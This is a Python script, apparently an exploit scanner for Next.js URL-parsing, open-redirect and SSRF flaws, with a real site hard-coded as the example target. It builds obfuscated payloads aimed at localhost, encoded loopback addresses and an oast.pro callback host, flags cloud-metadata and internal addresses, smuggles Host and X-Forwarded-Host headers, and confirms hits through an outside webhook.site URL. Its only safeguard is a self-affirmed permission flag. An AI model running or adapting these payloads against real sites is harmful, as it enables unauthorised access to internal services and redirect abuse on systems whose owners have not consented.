#!/usr/bin/env python3
"""
python3 next15_ultra_v8.py \
  --target https://demo.djangocfg.com \
  --prove https://webhook.site/05f5d63c-5397-43ad-9e02-b32d0c8356a0 \
  --workers 8 \
  --timeout 8 \
  --i-have-permission


next15_ultra_v8.py
Enhanced, safe GET-only tester for Next.js URL parsing/redirection bugs.
Non-destructive by default. Use --i-have-permission to acknowledge you own/are allowed to test target.

Usage:
  python3 next15_ultra_v8.py --target https://demo.djangocfg.com --prove https://webhook.site/XXXX --out ultra_v8_results.json
"""
import argparse, requests, urllib.parse, json, time, random, string, csv
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List

USER_AGENT = "next15-ultra-v8/1.0"
DEFAULT_TIMEOUT = 8
DEFAULT_SLEEP = 0.05

# --- helpful utilities ---
def randtag(n=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))

def pct(s: str) -> str:
    return urllib.parse.quote(s, safe='')

# --- payload builder (extend as needed) ---
def build_payloads(prove_url, tag):
    purl = urllib.parse.urlparse(prove_url) if prove_url else None
    prove_host = purl.netloc if purl else "example.com"
    # base set (extended)
    raw = [
        "/%5C%5Clocalhost:3000",
        "/%5Chttp://127.0.0.1:3000",
        "//http://localhost:3000",
        "//127.0.0.1:3000",
        "/%5C" + prove_url,
        "/%5C%5C" + prove_url,
        "//" + prove_url,
        "/%255C" + prove_url,
        "/%EF%BC%8Fhttps://" + prove_host,
        "/_next/image?url=%5C%5Chttps%3A//" + prove_host + "&w=64&q=75",
        "/.well-known/%5Chttps://" + prove_host,
        "/login?next=%5C%5Chttps%3A//" + prove_host,
        "/og/%5C%5Chttps://" + prove_host,
        "/api/fetch/%5C" + prove_url,
        "/user/%5C%5C" + prove_url,
        "/search?q=%5C%5C" + urllib.parse.quote(prove_url),
    ]
    # incorporate some obfuscations found in v6/v7
    obf = [
        "///http%3A//0x7f000001/%3Fnext%3D{tag}",
        "////HttP%253A//{prove_host}/~root/{tag}",
        "////HttP://127.0.0.1/go/{tag}",
        "////http://6vcohakqqp.oast.pro/?u={tag}",
        "///h%74tp:%2F%2F127.0.0.1:80/?u={tag}",
        "//http%253A////017700000001/%253Fnext%253D{tag}",
        "/http%253A/127.0.0.1%253A3000/go/{tag}",
        "/http%3A//127.0.0.1/go/{tag}",
        "/http://127.0.0.1:3000/api/img?src={tag}",
        "/https%3A//127.0.0.1/api/img?src={tag}",
    ]
    payloads = []
    for t in raw:
        payloads.append(t + ("&" + tag if "?" in t else ("?" + tag)))
    for template in obf:
        payloads.append("/" + template.format(tag=tag, prove_host=prove_host) + ("&" + tag if "?" in template else ("?" + tag)))
    # add a few randomized variants
    for i in range(12):
        p = random.choice(["//http://127.0.0.1", "/%5Chttps://" + prove_host, "//" + prove_host])
        payloads.append(p + ("?t=" + randtag()))
    # dedupe
    return list(dict.fromkeys(payloads))

# --- detection heuristics ---
DEF_SUSPECTS = ["127.0.0.1", "localhost", "169.254.169.254", "10.", "192.168.", "PROVE_URL", ".next/server"]
def detect_indicators(chain_text: str, prove_url: str):
    inds = []
    for s in DEF_SUSPECTS:
        if s == "PROVE_URL":
            if prove_url and prove_url in chain_text:
                inds.append("PROVE_URL")
        else:
            if s in chain_text:
                inds.append(s)
    # simple length anomaly: very short Location or repeated encoding
    if "location" in chain_text and len(chain_text) < 100:
        inds.append("length_anomaly_low")
    return sorted(set(inds))

# --- worker: send and optionally try host-smuggle variants ---
def send_probe(target, path, prove_url, timeout, headers):
    out = {"path": path, "chain": []}
    base = target.rstrip("/") + path
    try:
        r = requests.get(base, headers=headers, timeout=timeout, allow_redirects=False)
    except Exception as e:
        out["error"] = str(e)
        return out
    out["chain"].append({"url": base, "status": r.status_code, "location": r.headers.get("location"), "snippet": (r.text or "")[:300]})
    hops = 0
    MAX_HOPS = 6
    while r.headers.get("location") and hops < MAX_HOPS:
        loc = r.headers.get("location")
        next_url = urllib.parse.urljoin(base, loc)
        try:
            r = requests.get(next_url, headers=headers, timeout=timeout, allow_redirects=False)
        except Exception as e:
            out["chain"].append({"url": next_url, "error": str(e)})
            break
        out["chain"].append({"url": next_url, "status": r.status_code, "location": r.headers.get("location"), "snippet": (r.text or "")[:300]})
        hops += 1
    combined = json.dumps(out["chain"])
    out["indicators"] = detect_indicators(combined, prove_url)
    return out

def try_host_smuggle_variants(target, path, prove_url, timeout):
    hosts = ["127.0.0.1", "localhost", "0.0.0.0", "::1", urllib.parse.urlparse(prove_url).netloc if prove_url else "example.com"]
    headers_base = {"User-Agent": USER_AGENT}
    results = {}
    for h in hosts:
        headers = headers_base.copy()
        headers["Host"] = h
        headers["X-Forwarded-Host"] = h
        headers["X-Real-IP"] = "127.0.0.1"
        res = send_probe(target, path, prove_url, timeout, headers)
        results[h] = res
    return results

# --- main CLI ---
def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", required=True)
    parser.add_argument("--prove", required=True)
    parser.add_argument("--out", default="ultra_v8_results.json")
    parser.add_argument("--csv", default="ultra_v8_results.csv")
    parser.add_argument("--workers", type=int, default=6)
    parser.add_argument("--timeout", type=int, default=DEFAULT_TIMEOUT)
    parser.add_argument("--sleep", type=float, default=DEFAULT_SLEEP)
    parser.add_argument("--i-have-permission", action="store_true", help="Affirm you have permission to test the target")
    args = parser.parse_args()

    if not args.i_have_permission:
        print("ERROR: this tool must be run only with permission. Re-run with --i-have-permission")
        return

    TAG = "tag=" + randtag(10)
    payloads = build_payloads(args.prove, TAG)
    print(f"[+] Next15 ULTRA v8 — tag={TAG} target={args.target} payloads={len(payloads)} workers={args.workers}")

    headers = {"User-Agent": USER_AGENT}
    out_all = {"target": args.target, "prove": args.prove, "tag": TAG, "results": {}}
    with ThreadPoolExecutor(max_workers=args.workers) as ex:
        futures = {}
        for p in payloads:
            futures[ex.submit(send_probe, args.target, p, args.prove, args.timeout, headers)] = p
            time.sleep(args.sleep)
        # collect
        for fut in as_completed(futures):
            p = futures[fut]
            try:
                res = fut.result()
            except Exception as e:
                res = {"error": str(e)}
            out_all["results"][p] = res
            # if base probe indicates PROVE_URL or internal hosts, run host-smuggle quick tests
            chain_text = json.dumps(res.get("chain", ""))
            if args.prove in chain_text or any(x in chain_text for x in ["127.0.0.1", "localhost"]):
                out_all["results"][p]["host_smuggle"] = try_host_smuggle_variants(args.target, p, args.prove, args.timeout)
    # write outputs
    with open(args.out, "w") as f:
        json.dump(out_all, f, indent=2)
    # write a flat csv summary
    with open(args.csv, "w", newline='') as csvf:
        w = csv.writer(csvf)
        w.writerow(["path", "final_status", "indicators"])
        for p, info in out_all["results"].items():
            final = info.get("chain", [])[-1].get("status") if info.get("chain") else None
            inds = "|".join(info.get("indicators", []))
            w.writerow([p, final, inds])
    print(f"[+] Done. JSON -> {args.out}, CSV -> {args.csv}")
    print("[+] Now check your PROVE_URL/webhook for incoming hits with tag:", TAG)

if __name__ == "__main__":
    main()
